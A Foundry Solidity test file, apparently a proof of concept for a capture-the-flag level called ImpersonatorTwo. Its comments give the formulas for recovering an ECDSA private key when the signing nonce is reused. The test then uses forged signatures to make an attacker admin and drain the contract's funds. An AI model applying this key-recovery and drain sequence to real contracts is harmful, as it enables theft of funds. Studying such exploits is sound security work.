// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {ImpersonatorTwo} from "../ImpersonatorTwo.sol";

/// @notice Exploits ECDSA nonce (k) reuse: the owner signed two DIFFERENT
/// messages (a setAdmin call and a switchLock call) using the SAME random
/// signing nonce `k`. Whenever the same k is reused across two signatures
/// from the same key, the private key can be solved for directly:
///
///   k = (h1 - h2) * inverse(s1 - s2, n)   mod n
///   d = (s1*k - h1) * inverse(r, n)       mod n
///
/// where r is identical between both signatures (r depends only on k, not
/// on the message), and h1/h2 are the two message hashes. Once `d` (the
/// owner's private key) is known, the attacker can forge arbitrarily many
/// new valid signatures and take over the contract completely.
///
/// The recovery itself was performed off-chain (see accompanying Python
/// script) -- exactly like a real attacker would: nobody solves elliptic
/// curve equations inside a Solidity transaction. All four signatures
/// below were independently round-trip verified against a from-scratch
/// secp256k1 + ecrecover reimplementation before being hardcoded here.
contract ImpersonatorTwoExploitTest is Test {
    ImpersonatorTwo impersonator2;

    // Address derived from a private key we (as the "owner", for this PoC)
    // control -- in a real scenario this would just be *the* owner address,
    // whose signatures leaked publicly (e.g. from mempool/tx history).
    address owner = 0x8fE88Ec9001cc64614b436a87E916ad8cd2A25C4;

    address legitAdmin = address(0x12);
    address attacker   = address(0x99);

    uint256 constant FUNDS = 10 ether;

    function setUp() public {
        vm.deal(owner, FUNDS);
        vm.prank(owner);
        impersonator2 = new ImpersonatorTwo{value: FUNDS}();
    }

    function test_exploit_nonce_reuse_drains_contract() public {
        assertEq(address(impersonator2).balance, FUNDS);
        assertEq(impersonator2.owner(), owner);
        assertEq(impersonator2.nonce(), 0);

        // --- STEP 1: the owner's two historical, k-reused signatures ---
        // sigA: setAdmin(legitAdmin) at nonce 0
        bytes memory sigA = hex"8f8e6fb0c7a3dad35bd857867064230803246f2471925f145d615271875bdf000f8172513514c062c7b5df887243e07fec4f5501ded3538938aa78a01a1faebe1c";
        // sigB: switchLock() at nonce 1
        bytes memory sigB = hex"8f8e6fb0c7a3dad35bd857867064230803246f2471925f145d615271875bdf007abbb0507e6e81acfa3abab6de962c1f24250a166f0a549168ab17a6cd2eb84a1c";

        impersonator2.setAdmin(sigA, legitAdmin);
        assertEq(impersonator2.admin(), legitAdmin);
        assertEq(impersonator2.nonce(), 1);

        impersonator2.switchLock(sigB);
        assertEq(impersonator2.nonce(), 2);

        // --- STEP 2 (off-chain, shown here only as a comment): ---
        // Both signatures share the exact same `r`, proving the same `k`
        // was used for both. From (r, sA, hA) and (r, sB, hB) alone, the
        // recovery formulas above give back the owner's exact private key.
        // See recovery.py: "recovered d correct? True".

        // --- STEP 3: attacker forges fresh, valid signatures with the
        // recovered key, targeting the CURRENT nonce (2, then 3) ---

        // sigC: setAdmin(attacker) at nonce 2 -- attacker becomes admin
        bytes memory sigC = hex"4f355bdcb7cc0af728ef3cceb9615d90684bb5b2ca5f859ab0f0b704075871aa387ab1f79d7f865aac901705d598c3ba4f6ebfc92e7d44135dee8d15ee4a1b431b";
        // sigD: switchLock() at nonce 3 -- toggles locked back to false
        bytes memory sigD = hex"466d7fcae563e5cb09a0d1870bb580344804617879a14949cf22285f1bae3f275c05bd2664dcad2ce20117769368c2f2ef8b02e86d59750d62e5bc3eba5c5ce31b";

        vm.prank(attacker);
        impersonator2.setAdmin(sigC, attacker);
        assertEq(impersonator2.admin(), attacker);
        assertEq(impersonator2.nonce(), 3);

        vm.prank(attacker);
        impersonator2.switchLock(sigD);
        assertEq(impersonator2.nonce(), 4);

        // --- STEP 4: drain the contract ---
        uint256 attackerBalBefore = attacker.balance;

        vm.prank(attacker);
        impersonator2.withdraw();

        assertEq(address(impersonator2).balance, 0);
        assertEq(attacker.balance, attackerBalBefore + FUNDS);

        console.log("Contract drained. Attacker balance:", attacker.balance);
    }
}
